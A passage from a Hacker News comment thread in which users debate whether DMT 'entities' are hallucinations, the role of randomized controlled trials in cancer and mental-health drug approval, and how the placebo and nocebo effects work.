you are conscious (and I never can; your qualia of the concept of the color red and your other internal world-state representations are solely yours, assuming you are not a P-zombie). For the record, I also do not make magic claims of free will nor assume there are laws outside known physics. If you wish to call in dark matter as a potential agent of causal change, then you can propose your theories backed by evidence and we'll continue as the evidence leads. But as far as my own existence, well, cogito ergo sum and all reply cheeseomlit 16 hours agorootparentprevWe communicate with other people and entities in dreams as well, and they seem completely convincing during the experience. While its not impossible for the self-replicating machine elves from the 5th dimension to actually exist, I think its more likely they're reflections of our psyche or something like that reply BriggyDwiggs42 13 hours agorootparentOf course it’s more likely, I’m just arguing we shouldn’t dismiss the possibility just because it sounds silly before we’ve studied it thoroughly. reply r2_pilot 6 hours agorootparent> before we’ve studied it thoroughly. I don't know about you, but I have studied reality pretty extensively over the years. I have yet to come across evidence that I would submit to a court of law regarding the existence of winged eyeballs, or other products of a hallucination. Having said that, several lawyers seem to be submitting such hallucinations in court thanks to AI, so maybe that technology can help us investigate this possibility of extracorporeal entities. reply nathan_compton 4 hours agorootparentprevI think the preponderance of evidence points strongly to these phenomena being purely mental - in particular the vast majority of conscious behaving entities which we encounter on a regular basis are physical objects with certain properties (having a brain is the big one) and what we know about physics, biology, computation, and neuroscience makes a pretty compelling case that the physical object in question (the brain) is intimately, probably one to one, connected with the phenomenon we identify as the entity. It would be very strange if we found evidence of non-material entities given this context. And in the case of the self-transforming machine elves we very clearly have a compatible alternate hypothesis: they are generated by the brain which we are mucking around in with chemicals which are known to disrupt its behavior. reply r2_pilot 16 hours agorootparentprevActually, the people who are making the claim that the hallucinations are external entities are asserting a position. And with a quick application of Hitchens' Razor, that which is claimed without evidence can be dismissed without evidence. reply telotortium 5 hours agorootparentThey do have evidence - their own experiences! It’s not very convincing evidence, to be sure, but as the replication crisis shows, even “objective” evidence can fail to be convincing or demonstrative for various reasons. reply sdenton4 4 hours agorootparent... The replication crisis does not - I repeat, does not - lower the standard for acceptable evidence in the sciences. reply telotortium 3 hours agorootparentFirst, the replication crisis, or at least its recognition, should if anything raise the standard for acceptable evidence. More pertinently, I am talking here on a purely social and practical level. You seem to have taken it as a moral statement. reply Aloisius 14 hours agorootparentprevPeople totally blind from birth taking hallucinogens don't see entities which strongly suggests they're not real. reply spacetimeuser5 4 hours agorootparent>>People totally blind from birth taking hallucinogens don't see entities So these people do not trip at all on hallucinogens? Sounds like rather improbable. ~70% of what you call \"visual experience\" is driven by non-visual cortices, like anterior cingulate, for example. And even before the visual cortex, even on the thalamus level, the thalamus receives up to ~60% of top-down connections from non-visual cortices. You do not need to literally see anything in order to get the information about it. Get your potato, monkey. reply telotortium 5 hours agorootparentprevNot a parsimonious explanation - more likely, the visual cortex needs to be trained in order to see anything, even in the mind’s eye. reply delecti 14 hours agorootparentprevI agree the entities probably aren't real, but an equally supported hypothesis would be that you need to see the entities to \"see\" the entities. reply tsimionescu 14 hours agorootparentThat is easy to check if you measure the amount of light reaching the eyes of the patient while the experience is happening. Without even checking, I am already quite confident that no extra light will be reaching their eyes because they took some drug, but it's easy to measure. reply lupire 52 minutes agorootparentThis makes no sense. You are constantly being bombarded with sensory phenomena that your nerves detect but your brain ignores. For example, you smell almost nothing, nearly all the time, despite being able to smell those scents occasionally, such as when you move to a different environment. Changing your brain somehow to notice those phenomena would not change the physical phenomena. reply Aloisius 14 hours agorootparentprevExcept some people who lost their vision late in life can experience them. reply yosame 11 hours agorootparentBecause they still have a developed (if atrophying) visual cortex to generate the visual hallucinations. reply tsimionescu 14 hours agorootparentprevOf course we do, what do you mean? We can obviously check if there is anyone else in the room, with various instruments, and if there isn't, we obviously know for certain that the experience was purely generated by the brain. What else could it even be? reply BriggyDwiggs42 12 hours agorootparentWe need to account for the odd similarity of experience across users, which leads to two most probable explanations. First, the brain generates the experience, and the patterns are a consequence of structural similarities across human brains. Second, these entities actually exist somehow and we can’t yet observe them with our modern instruments. I certainly think that the first is more likely, but I think we need to do more work to reduce the probability of the second, likely by recording the brain activity similarities we would expect to see if it were a generated experience or by finding a number of individuals who don’t have the same experiences. We can also have people undergo extended trips, as is being tested currently, and see if the characteristics of the entities or the world indicate a generated experience. My only point was that, since this is a matter that depends entirely upon subjective conscious experience, a phenomenon we lack tools to measure and understand somewhat poorly, and since this substance is majorly understudied, it isn’t smart to simply assume that the first explanation is the correct one. reply tsimionescu 12 hours agorootparentThe second \"explanation\" requires a fundamental upending of basic physics research that is confirmed to higher degrees of accuracy than any direct experience we have ever had. The first explanation, while slightly handwavy, perfectly fits all established models of physics, chemistry, biology, neuroscience, and psychology. I think even mentioning the second explanation is entirely splitting hairs. It's like reminding everyone that physics can't rule out that God could have created the world with its apparent 8 billion year history 2 hours ago. reply BriggyDwiggs42 7 hours agorootparentActually yeah I think you’re right. reply lupire 48 minutes agorootparentThis is called Bayesian reasoning, BTW, and you subconsciously do it all the time. Your entire life would be almost completely incomprehensible otherwise. reply mistermann 13 hours agorootparentprevIs it scientific consensus that an absence of evidence is proof of absence? And even if so: is it necessarily true? PS: did you notice you're using the same methodology \"believers\" use: it's obvious? reply tsimionescu 12 hours agorootparentGive the extreme level at which we understand the basic functioning of the physical world (the Standard Model), yes, absence of evidence for a phenomenon that would contradict this model constitutes evidence of absence of such a phenomenon. That is, since the only possible known interactions that the brain could pick up are electrical in nature, and given that no external electrical field changes are observed, that constitutes evidence that no external signal is being received by the person. The weak and strong forces don't work at such distances, so they are out of the question, and gravitational waves or neutrinos are far too weak to be detected by our brains, and impossible to make so targeted that only a single individual would receive the signal. Now, is it conceivable that a different fundamental interaction that mammalian brains can detect but that none of our experiments have ever found could exist? Yes, but it is so extraordinarily unlikely that it can be dismissed out of hand, absent any proof. And the memories of people experiencing hallucinations are certainly not proof. reply TeMPOraL 5 hours agorootparentI'll add to it that there's a wide range of documented cases of humans experiencing all sorts of weird phenomena when their brains are being physically poked at. A drug chemically circuit-bending your brain therefore seems much more likely explanation than opening it to perceive an extra dimension of reality. -- [0] - https://en.wikipedia.org/wiki/Circuit_bending reply mistermann 33 minutes agorootparentprev> ... constitutes evidence of absence of such a phenomenon. Mostly everyone prefers that easy version of the question, but that isn't the one I asked. The one I asked is: Is it scientific consensus that an absence of evidence is proof of absence? (\"proof\" vs \"evidence\") (Note also my question was about scientific consensus, but you are welcome to choose either version.) > That is, since the only possible known interactions that the brain could pick up are electrical in nature This seems \"off\" to me...\"the only know to be possible\" seems perfectly logical, whereas your wording almost sounds like you determine how Mother Nature runs the show. Granted, that's how it intuitively seems, but still. Regardless, for clarity: are you asserting that the final answered has been reached here, in fact? Still outstanding (for bonus points): >> And even if so: is it necessarily true? >> PS: did you notice you're using the same methodology \"believers\" use: it's obvious? For your troubles, an extra bonus question: Did atoms exist before they were discovered to exist? reply jonathankoren 13 hours agorootparentprevThis is an absurdly credulous take. If we took this face value, then we'd have assume that Carl Sagan really did keep an invisible flying dragon his garage.[0] This position is the exact opposite of rational thought. Say it with me, \"Extraordinary claims require extraordinary proof.\" Even famed psychonaut, and inventor of the self-transforming machine elves meme, Terance McKenna said the only way to prove that it wasn't all in your head was to ask the elves a question that was easily and objectively verifiable, but you didn't know the answer. He couldn't do that. He said so. He still publicly said that he believed they were real transdimensional intelligences, but he made no qualms about the fact that he had no proof, they're just a hallucination was very real possibility. (They are.) [0] https://en.wikipedia.org/wiki/The_Demon-Haunted_World#Dragon... reply spacetimeuser5 3 hours agorootparent>>Say it with me, \"Extraordinary claims require extraordinary proof.\" Let's be honest with it. So someone is experiencing the self-transforming machine elves. Please provide the exact description of neuronal circuitry (numbers of neurons, network architectures, interconnectivity patterns, amounts of neurotransmitters used, spike patterns and the resulting EEGs etc) which generates this exact experience. Ask a distinguished professor of neuroscience. Use integrated information theory, emergent properties, quantum collapse in microtubules, whatever currently established paradigm - and provide the exact, 100% comprehensive and full description of the brain state that presumably generates this exact experience, also allowing to differentiate from all other experiences like just \"machine elves\", \"non-self-transforming machine elves\" or elves with any other properties. Or just begin with the 100% comprehensive and full description of the brain state/circuitry generating the taste of vanilla, which would be distinctly differentiable from the state/circuitry generating a taste of chocolate or garlic. reply Karunamon 5 hours agorootparentprevThe extraordinary nature of a claim or its proof is by nature a subjective one. reply tsimionescu 14 hours agoparentprevIt's quite common, though poorly understood, for the brain to have surprisingly consistent hallucinations in response to a particular substance. Just like seeing the same sort of entities on DMT, people in accute alcohol withdrawal almost all report hallucinations of small-ish vermin (e.g. rats, snakes, mice, cockroaches). It seems pretty clear that these substances each produce their own particular kind of input to the brain that then gets interpreted by the very similar neural circuitry we all have to the same kind of memory/experience. I wonder if this type of thing will actually end up helping neuroscience research as well, seeing as how some of these substances seem to push higher level concepts than what is typically easily induced in an fMRI. If they turn out to be safe for human use, they should be usable in this setting as well. And yes, of course an entity your brain is hallucinating \"knows\" about your memories. It's you talking to yourself. reply qbxk 13 hours agorootparentit seems like you're a bit too comfortable with thinking that just because the hallucinations are hallucinations they must be useless. alcoholics see snakes and rats and vermin, and that's not very much help to anybody. but all these psychedelic folks are hallucinating higher orders of intelligence that understand their trauma and can help them? hallucination or not, seems like a useful thing to have access to. far more than shadows of snakes, for sure reply tsimionescu 12 hours agorootparentAs the other commenter pointed out, I'm not at all claiming they are useless. I actually think it's more likely than not that the hallucination itself is what is having the therapeutic effect, that it's not a side effect at all. And even if that's not true, I think it's still very wise for the one experiencing it to engage with the hallucination. All I'm saying is that none of this makes it even slightly remotely possible that it is anything other than a hallucination. And note: they are not hallucinating a higher level of intelligence, they are hallucinating a way to accept their own trauma in the form of an entity that appears more intelligent. Just like when writers create a super-intelligent alien in a movie, they don't actually create something more intelligent than humans. Now, if they were seeing an entity that explained new ways of solving partial differential equations to them, then I would say that the external entity hypothesis merits some investigation. reply slfnflctd 5 hours agorootparentI'm deeply appreciative of the voice of reason in these discussions. My parents raised me in a demon haunted world, and having access to the intellectual tools which brought me out of that world fills me with gratitude toward those who helped make them widely available and continue to do so. reply adammarples 5 hours agorootparentprevI have had dreams where I listen to songs and marvel at the incredible skill of the songwriter, and sadly accept that I could never have 1/10th of that skill. It was a surprise for me to reflect back on the dream and realise that of course because it was my dream I was in fact the song writer too, somehow also able to listen to it with no idea what would come next. The mind is a fascinating thing. reply sdenton4 4 hours agorootparentWas the song actually that good, or did your brain simply tickle the 'appreciation for incredible beauty' neurons while playing back some Nickelback memories? reply andrewflnr 1 hour agorootparentI'm pretty sure I've experienced both, actually. Occasionally bits of it, melody or words, will survive in my memory that I think are actually good, if only I could reconstruct the rest of it. Other times I'm pretty sure there was nothing actually there. reply lupire 44 minutes agorootparentThe bit you remember might be great. The part you don't remember might never have existed. I've often \"solved\" problems in semi-lucid sleep, by brainstorming an idea and pursuing it, but when I push, the idea doesn't makes sense, or is meaningless, not just wrong. reply amenhotep 4 hours agorootparentprevThe trick is that you're not just generating the song; you're generating the experience of listening to the song. Much more efficient :) reply andrewflnr 13 hours agorootparentprevThey didn't imply the hallucinations were useless. Rather the opposite in fact. reply mistermann 13 hours agorootparentprevFor clarity: is this to say that it is a fact that these are simpy hallucinations, nothing more? reply tsimionescu 12 hours agorootparentIt is a fact that they are experiences in your brain and not communication with an entity of any kind outside your brain. The word \"hallucination\" sometimes has some negative connotations that suggest they are deceitful or useless experiences that you should ignore and forget. I'm not trying to say that at all. I do think it's quite possible that any therapeutic effect is entirely due to these experiences, and, if so, they should be encouraged, not ignored. reply mistermann 6 hours agorootparentTo you, what is the meaning of \"fact\" and \"is a fact\"? What, specifically, separates a \"fact\" from a \"non fact\" in this specific context? reply tsimionescu 1 hour agorootparentA fact is something which generally agrees with the accepted body of scientific knowledge, even if it challenges specific assumptions. A non fact is something that blatantly contradicts this body of knowledge without any credible new evidence. reply mistermann 25 minutes agorootparent> A fact is something which generally agrees with the accepted body of scientific knowledge, even if it challenges specific assumptions. Is there a difference between a fact and a scientific fact (from a Philosophy of Science perspective)? > A non fact is something that blatantly contradicts this body of knowledge without any credible new evidence. Can you cite anything authoritative that supports this claim? And....are \"fact\" and \"non fact\" the only two options? reply adammarples 5 hours agorootparentprevWhat possible answer do you think there could be to this question? Facts are true statements. Questioning what your interlocuter thinks a \"fact\" is isn't going to move the debate forward in any useful way. reply mistermann 27 minutes agorootparent> What possible answer do you think there could be to this question? There are a few different classes/categories you'll see, but not many. > Facts are true statements. Do (non-specialized, as in scientific facts) facts require a proof, or not? And if not.... > Questioning what your interlocuter thinks a \"fact\" is isn't going to move the debate forward in any useful way. Perhaps (is that future you see the real thing?), it may provide value though. reply JumpCrisscross 15 hours agoparentprev> all reported that these were beings of a higher intelligence and felt that they were external \"Jaynes asserts that consciousness did not arise far back in human evolution but is a learned process based on metaphorical language. Prior to the development of consciousness, Jaynes argues humans operated under a previous mentality he called the bicameral (‘two-chambered’) mind. In the place of an internal dialogue, bicameral people experienced auditory hallucinations directing their actions, similar to the command hallucinations experienced by many people who hear voices today. These hallucinations were interpreted as the voices of chiefs, rulers, or the gods\" [1]. Basically, the hypothesis that humans as late as the ancient Greeks were sort of schizophrenic [2]. (To be clear, it's a hypothesis, not science.) But it's neat to think of drugs like DMT reverting (converting?) us to that bicameral state. [1] https://www.julianjaynes.org/about/about-jaynes-theory/overv... [2] https://en.wikipedia.org/wiki/Bicameral_mentality reply anigbrowl 15 hours agorootparentSorry to see you're being downvoted. Origin of Consciousness is a masterpiece, even if it's wrong. reply MacsHeadroom 2 hours agoparentprev> The DMTx participants all reported... that these were beings of a higher intelligence and felt that they were external. This is not true. I know multiple DMTx participants and many report that the beings are conjurations of their own subconscious, i.e. very much \"internal.\" reply krzat 13 hours agoparentprevThere is psychological approach called internal family system, it explains personality as collection of entities that cooperate unaware of each other. Perhaps some drugs disturb this to such extend that it feels like there are multiple people in consciousness. If those external entities were real, we wouldn't need to wait for science, some shaman would just go to the spirit realm and get told about bacteria. reply vwoolf 4 hours agorootparentAnd also the argument that people have demons in them: https://www.astralcodexten.com/p/book-review-the-others-with.... I read some of the guy's book. It's a trip. If those external entities were real, we wouldn't need to wait for science, some shaman would just go to the spirit realm and get told about bacteria. A great point. reply lupire 40 minutes agorootparentprevPeople with DID and schizophrenia feel this way. reply ta060424 2 hours agoparentprev> Psychedelics are 100% challenging the gold standard. Whatever the that is lol. > Albert Hoffman the inventor of LSD also said he had contact with external entities on a trip (eyeball with wings) > It’s bittersweet though because it also is proof of how much progress we lost over those decades. This isn't science, it's a fresh coat of paint over witch doctors and medicine men. This isn't progress, this is regress. reply hattmall 15 hours agoparentprevAre you saying that speaking to external beings while tripping is potentially a treatment for mental health? I mean yeah, that's what it feels like when you really trip and sometimes it can be really exciting, sometimes it's interesting and feels informative, and sometimes it's completely terrible. The best feeling in the world is when you remember that you took drugs and the people telling you that you are stuck on a foreign planet in cold and darkness away from everyone you know for eternity aren't real, that the sun is in fact coming up and you are just on earth in your friends backyard. I have a really hard time thinking anyone that proposes tripping as a viable solution to true mental health problems is a serious person. There's basically two camps of people in that arena, and it's people that haven't done many drugs, and people that did too many drugs. reply TeMPOraL 4 hours agorootparent> Are you saying that speaking to external beings while tripping is potentially a treatment for mental health? \"External\" but really just products of your brain, and yes, I could see how this would be helpful. Taking such drugs seem like giving a whack to the brain to the point you enter a kind of \"debug mode\"; perhaps some issues that you can't normally untangle are accessible directly in that mode. At the very least, you get to poke at your internal state from angles normally not available to you, so some of your mental blocks could shake loose and fall back into place. (I wouldn't know, I never took anything like it or had any similar experiences, but that's what I gather from reading countless stories and reports of those who did.) reply micromacrofoot 3 hours agorootparentprevif we were to dramatically oversimplify it, we could say that these drugs grant someone a perspective that they were unable or unwilling to achieve through their typical thought processes it's not hard to imagine why sometimes that can be helpful, and we can try to optimize towards \"usually helpful\" — but sure they could also be harmful or plain useless reply optimalsolver 4 hours agoparentprev>Albert Hoffman the inventor of LSD also said he had contact with external entities on a trip (eyeball with wings) and said that it told him that they chose him to discover LSD for the sake of humanity When will these entities share something truly useful, like the design for a working cold fusion reactor, or a cure for Alzheimer's? Also, people really need to know that while a psychadelic trip can be healing and mystical, it can also go like this: https://www.reddit.com/r/DMT/comments/gb9ar0/dark_dmt_trip_r... reply colechristensen 16 hours agoparentprevYes hallucinating higher powers making contact with plans for the subject to make the world better is… a consistent but rarely encountered feature of the human brain. Go read the descriptions of angels in the Bible and it reads just like somebody tripping. One of the reasons hallucinogens are dangerous is that there’s a risk that users will believe in their hallucinations and try to start cults. Timothy Leary was one of these drug-induced zealots and he among others were the reasons LSD et al got banned in the first place. They wanted to overthrow society and implement a quasi-religion based on the drugs. reply jseliger 16 hours agoprevRCTs are fine but the obsession with them is overwrought and counterproductive. My own drum to beat on this is regarding clinical trials for fatal diagnoses like cancer: https://jakeseliger.com/2024/01/29/the-dead-and-dying-at-the.... We have Kaplan-Meier curves for fatal diagnoses. We know what happens (the tumors grow and metastasize. One doesn't need elaborate phase 3 RCTs to figure out if there's a good shot that a treatment is working; one can see it in tumor response and comparison to known KMCs. The existing system raises costs and causes people to die while waiting a decade or more for exciting treatments: https://atelfo.github.io/2023/12/23/biopharma-from-janssen-t... Moderna's mRNA-4157 is a current example of this: https://jakeseliger.com/2024/04/12/moderna-mrna-4157-v90-new..., although it may be held up by lack of manufacturing capacity as well. reply Aurornis 15 hours agoparent> RCTs are fine but the obsession with them is overwrought and counterproductive. My own drum to beat on this is regarding clinical trials for fatal diagnoses like cancer: RCTs for mental health conditions are a completely different situation. The short-term placebo response rate for cancers is not high (obviously) though the influence of unblinded trial operators making subjective analyses can be a problem. Many mental health conditions, on the other hand, have unbelievably high placebo response rates over the duration of a short trial. The magnitude of the placebo response is almost hard to believe in certain studies. The placebo effect can be a problem for approving new drugs as some times the placebo group improved so much that there isn’t much room left for the active drug to improve beyond that. This is a problem of study design and rating systems that is difficult to solve. Unfortunately, some study operators use this fact to their advantage by omitting placebo group. Without a placebo group, it’s not obvious that the drug is actually doing anything better than placebo, of course. reply BurningFrog 15 hours agorootparent> * Many mental health conditions, on the other hand, have unbelievably high placebo response rates over the duration of a short trial* Probably how faith healing works. reply vitiral 15 hours agorootparentIf someone could explain how \"the placebo effect\" is not just \"scientifically proven faith healing\" I'd love to hear it. reply tsimionescu 14 hours agorootparentIt varies a lot. For many conditions, like cancers, the placebo effect is basically random noise (cancers sometimes just reduce or go away on their own, regardless of treatment or even of the appearance of treatment ; we don't know the natural rate of this, because it's unethical to not treat people who you know have cancer). In addition, in non-blind trials, there is a \"placebo effect\" that amounts to mistakes or lies by those involved in the research in favor of a positive outcome. This is not a real effect in patients at all, just an artifact in the reported data. Then, for conditions linked to our psyche, including pure psychological conditions but also things like pain, blood pressure, heart rate, nausea, and some others - the placebo effect is more real, but usually temporary. Some people who have been living in some amount of despair at their condition experience a positive surge of hope once treatment starts, and they can ignore the pain, or feel some push to get out of their depression, or calm their anxiety which was exacerbating, say, the high blood pressure etc. This effect almost always tapers off if the treatment is not doing anything more fundamental. Coupled with the fact that we don't understand how psychological disorders work at the chemical level at all, especially in relation to the conscious mind and interventions on that (e.g. therapy, but also various religious practices), this means it's very hard to account for this without a double-blind RCT. reply disgruntledphd2 4 hours agorootparent> they can ignore the pain, Just to note that on pain specifically, belief that one has been administered a drug can cause the body to synthesise painkillers. This has been most rigorously demonstrated by the fact that these painkilling effects are suppressed by naloxone (an opioid antagonist). reply taeric 3 hours agorootparentI'm fairly convinced this is not much different than the way that your body will prime itself if it knows you have an alarm going off at a given time. I don't have the paper anymore, but it was shown that your hormone profile will change with just the knowledge of an alarm. Similar results have been found for other drugs and using cues to the body so that it will prime them itself. I'd love to read more on how this links to the powers of ritual and general routines. Specifically, if I'm not misremembering, it isn't just \"belief that one has been administered a drug\", but it has to be a drug that you have had before. Or that you have seen work on someone else. Just taking sugar pills does nothing. Taking sugar pills that you thought were the aspirin pills you took last time you were sick can cause the body to react. reply burnished 3 hours agorootparentprevFascinating reply dr_dshiv 3 hours agorootparentprevThe placebo effect is not a single thing. That is, there are ways of amplifying the effect and minimizing the effect. For maximum effect, treatments ought to be designed to take advantage of the placebo effect to the extent possible. That’s because placebos have low side effects and are often very effective. However, this creates some challenges — how do you test which placebo effect works best? What do you use as a placebo? It’s not that hard, really — just use a placebo with less of a placebo effect. Niacin was used as the placebo for Timothy Leary’s Good Friday experiment [1], where he randomly dosed catholic monks on psilocybin. Unlike a sugar pill, Niacin creates some facial flushing — so you do feel something. But it would be very clear eventually that you didn’t get the psilocybin. But that doesn’t negate the findings of the experiment. [1] https://en.wikipedia.org/wiki/Marsh_Chapel_Experiment reply tsimionescu 1 hour agorootparentSure, for those conditions that have subjective components (e.g. pain, mood) or where there is more or less direct conscious control of the condition (e.g. heart rate, BP), you can vary the strength of such effects. But in many other conditions, you can't, because that kind of placebo effect is just noise. For example, you can't vary the effectiveness of placebo effects in antibiotics studies (though you may be able to reduce certain side effects like headache or nausea). reply vitiral 6 hours agorootparentprevThe problem as I see it is that all medicine is fundamentally trying to find effective scaffolding on the human body, triggering it's own ability to heal. A surgeon can't repair a corpse. What causes the body to heal itself more effectively? I would think this is brutally difficult to study, since it's all subjective. reply Zababa 4 hours agorootparentI think part of medicine is that, but part of medicine is trying to keep you alive despite your body. Or maybe what I'm arguing here is the \"body healing itself\". But for example, if you have autoimmune disease, or allergies, you want the body to slow down and take it easy because it's harming itself. reply vitiral 0 minutes agorootparentsure. How effective is faith/placebo at curing those conditions I wonder? ziddoap 5 hours agorootparentprevFaith healing has heavy religious tones. Yet not everyone who responds positively to a placebo is religious. So, it feels sort of weird to call the placebo effect some form of faith healing. reply vitiral 25 minutes agorootparentThat was the point of the question. Wouldn't you say \"placebo\" has heavy intellectualizing overtones? reply ziddoap 21 minutes agorootparentNo, I wouldn't. reply vitiral 0 minutes agorootparentWhy not? protonfish 4 hours agorootparentprevI guess it depends on how you define religion. I think that we can have faith in anything - science, your doctor, etc. that could work in a similar fashion to religious faith. reply burnished 4 hours agorootparentThis is specious. Religion is clearly centered around the spiritual and physical beliefs about the world and the practices of a specific group. Trusting your doctor is usually more along the lines of an educated guess due to the necessity to act without perfect information. reply Zababa 4 hours agorootparentprevI think part of it is regression to the mean. Like, your body heals itself naturally from many things. Say you get a cold. For most people at some point it'll heal. If you have a group of people with the cold, and try to determine how effective vitamin C or zinc or COLDKILLER777 is, you can't just give it to them and say \"look, they're healed\", because they would heal naturally. You have to prove that they feel less symptoms or heal faster than people in the same circumstances that don't receive the same molecule. I also remember some similar stuff for back pain and surgeries. In that context people were seeking treatment when their back issues peaked, and the question was, when you take the cohort of people that had back surgery and the cohort of people that didn't, did the back surgery make a difference? Because some people healed naturally. I don't know if this is true in that specific context, but to take a more pedestrian one, I've had lots of small cuts, burns and things like that during my life, and they all healed. reply somenameforme 3 hours agorootparentThe placebo effect controls for all of these factors, and is entirely real. It's the reason placebo control groups exist in the first place. If the placebo effect was just statistical noise, then you could greatly simplify trials by just taking a random group of people as the control, and do away entirely with trying to hide from both patient and technician who is taking the drug - because it wouldn't matter at all. You can see the opposite effect with the less well known nocebos [1]. People can experience objectively measurable side effects (such as bloating) that are in no way associated with a treatment, but that a patient believes to be a side effect. It can even be fatal. The article references aboriginals who will 'curse' one another resulting in the victim rapidly dying, because he believes so strongly that he is going to die! A similar thing in contemporary medicine has been observed with those who receive a fatal prognosis of cancer with them ending up dying long before there is any way the cancer could have killed them. [1] - https://en.wikipedia.org/wiki/Nocebo reply otherme123 14 hours agorootparentprevPlacebos doesn't heal. They just seem to relief some symptoms typically self reported, like pain, but the underlying cause is still there. reply Xymist 9 hours agorootparentThe tricky thing about that (which isn't false, per se) in the context of mental health is that \"relieve some self reported symptoms\" can actually be sufficient treatment. As with many sorts of pain, if the patient feels better, _they are better_ in a meaningful sense. Whether it's \"real\" is sort of beside the point, especially if the problem is that they are (for example) too miserable to do normal life things that would stop them being miserable and the placebo is sufficient for them to feel as if perhaps they could. reply Uehreka 4 hours agorootparentNot necessarily. The placebo effect is the kind of thing where you might have trouble at first telling if your symptoms are improving or if you’re just having a “good day” or an “easy week”, and that confusion can even last a month or two during which you’re over-observing your internal state and feeling hopeful that “maybe this is what getting better feels like”. But in the long term you often figure it out. I had a placebo effect recently when switching ADHD medication to get around the shortages. For a couple months I thought there was a chance my new meds might actually be better, they definitely felt different (and still do). But six months in it’s clear to me that I’m struggling with productivity more than I was before I switched (though less than when I was off meds). I’m just one guy, but I’d guess this is why doctors don’t just prescribe placebos all the time as actual therapies (well, that and they’d lose credibility which would then destroy any remaining placebo effect). reply lukas099 5 hours agorootparentprevAlso, relief of emotional discomfort can help the patient adopt more behaviors that are associated with positive changes in mental health, such as exercise and pursuing social engagements. reply QuantumGood 5 hours agorootparentprevWarts are overall very responsive to placebos. My M.D. father, family practice in the army, later a pathologist, would do what he had learned from other doctors: Put some dye in toothpaste, put it on the wart(s), bandage it, talk about what a miracle cure it was etc. He said it worked the few times he tried it. reply sugarkjube 56 minutes agorootparentNothing to do with placebo, it's the covering that did the trick, not the talk about miracle cure. (I discovered this myself when I was a kid, any proper airtight cover is likely to get rid of it, YMMV) reply Modified3019 3 hours agorootparentprevFYI, food dyes are not inherently inert, and are capable of having antifungal, antiviral, and/or antioxidant effects. Quick examples: https://link.springer.com/article/10.1007/s10068-011-0002-0 https://www.purdue.edu/newsroom/releases/2020/Q3/new-approac... The pigments fungi produce are so essential to their survival, they can’t defend against pathogens when they are gene edited to stop producing them. Toothpaste is also far from an inactive substance, there are definitely plausible mechanisms at play with the toothpaste and dye mix that could help suppress/resolve a wart. It would be worth a study, though I’m not sure what one would use to try and achieve a truly inert placebo for comparison without first figuring out what doesn’t work. reply collyw 5 hours agorootparentprevStress negatively affects the outcome of patients, why couldn't the opposite be true? reply llamaimperative 7 hours agorootparentprevIt is but it’s a very finicky treatment. reply djtango 15 hours agorootparentprevIsn't that amazing? That we can help people extraneously without having to administer chemicals which have a nonlocalised effect on our bodies. There's still so much to learn I recently heard that new fathers see a reduction in testosterone. How does having a baby chemically alter a man!? What's the stimulus and mechanism for that... reply llamaimperative 7 hours agorootparentWhy couldn’t it just be cognitive? Your endocrine system is not totally isolated from your cognition. It’s fairly apparent how fathers amped up on testosterone could be worse for offspring survival than those who have a drop, so the evolutionary pressure is pretty clear, then the mechanism is readily explained by “they know that they have a child.” How does adrenaline get released when you see a dangerous situation with merely your eyeballs? reply edmundsauto 14 hours agorootparentprevAs a recent father: low sleep. reply nonameiguess 4 hours agorootparentThis plus added stress, likely poor nutrition, missed exercise, a whole lot of things happening to new fathers that can lower measured serum testosterone. Whether or not it matters is an entirely different matter. Headline bloodwork numbers don't mean much out of context, and most of the outcomes you'd actually care about (athletic performance, muscle retention, general feeling of wellbeing and energy level) are all impacted by the same things whether or not testosterone is lowered. The one thing that might matter separately is sperm production, but if you care about being maximally able to get your wife pregnant again immediately after she gives birth, you can get that tested separately. reply djtango 12 hours agorootparentprevI can't really refute this but I suspect based on the body of research on this study, the drop must be a lot more than just sleep deprivation. There are plenty of men who work long hours and have poor sleep but I don't believe the drop in T is as remarkable as that post partum How about the science behind how a baby's crying stimulates milk production. reply llamaimperative 7 hours agorootparentAgain cognitive. These are only challenging you because you’re assuming cognition cannot affect hormones/chemical systems but we know otherwise. reply djtango 6 hours agorootparentNot really challenging me, I'm more marvelling at the fact that as giant bags of proteins, we're able to look at our baby and our testicles decide that it's the time to stop doing what they do most of the time. Cognition is such a handwave IMO - what's the biochemistry behind that? What's the signalling mechanism by which our brain does that? Does that mean with the right external brain signals we can turn off T production? The implication of cognition having control over the body, which you assert is so well known, is that if we can achieve more control over our cognition we can achieve biochemical control of our body. So the bene gesserit is less fiction than we like to think? reply disgruntledphd2 4 hours agorootparentI think that (as with many of the problems of the modern world ;P) it can all be blamed on Descartes. The notion of dualism is profoundly problematic in a bunch of ways, but the biggest problem with it is that it created generations of scientists who ended up believing that consciousness and body experience are completely separate, which is a little ludicrous when you think about it. reply borski 5 hours agorootparentprev“Mind over matter” is not a colloquialism for no reason. It doesn’t work all the time, but to say it never does is a mistake. reply BurningFrog 6 hours agorootparentprevThis seems very much like a mechanism that would be favored by evolution, not an accident of circumstance. I have no clue how that mechanism migh operate, of course. I realize that makes this comment less persuasive, but so be it. reply djtango 5 hours agorootparentThe evolutionary advantage of it is fairly apparent - but understanding how we can control our own body chemistry without pharmaceutical intervention is of great interest to me. It's a silly example but what if you could combat age onset testosterone decline with brain exercises or by watching an hour of UFC everyday. I'd take that in a heartbeat over hormone therapy if it worked reply whythre 15 hours agorootparentprevPheromones from the pregnant mother seem like a good candidate for the reason behind Low T… reply collyw 5 hours agorootparentprevThe placebo effect is as powerful as many prescription drugs. It amazes me that scientists generally dismiss it rather than actually study it intensely. It's well known that stress can negatively affect your physiology, so I see no reason not to think that the opposite could be true. reply darepublic 5 hours agorootparentHence why magical thinking can be useful sometimes (or at least that's what I tell myself wishfully) reply bigyikes 5 hours agorootparentCan you say more? Does “magical thinking” mean religion, or something else? I’m actually curious. reply darepublic 5 hours agorootparentCan mean believing things will be OK, or events will somehow spare you, whatever the reason. Whether it's because of religious conviction, you've grown a lucky beard, had a happy dream the night before, etc. Even while being somewhat conscious of the irrationality of such beliefs they sometimes can be of help I feel. Also when music inspires / motivates you I feel like it stirs up a similar effects to a strong magical belief. reply burnished 3 hours agorootparentprev'Everything happens for a reason' is a pretty common example of magical thinking that you might be more familiar with. Basically when someone favors a magical principal over cause and effect when describing the world. I don't think it would make sense to say religion in general is magical thinking, a lot of religion can be moral or legal precepts or an explanation of the world that is rooted largely in cause and effect. There is clearly some magical thinking at play when you get into specifics but personally I'm not sure where we would say it enters play: is the belief in a final tallying magical thinking when it is justified by the belief that there exists an entity capable and willing? Not sure. reply tsimionescu 13 hours agoparentprevOne thing that doesn't often get appreciated in such discussions is that there are a lot of drugs that seem promising at first, but fizzle out in larger trials. If drug companies had a known pathway to go from positive initial results to very expedited approval, even 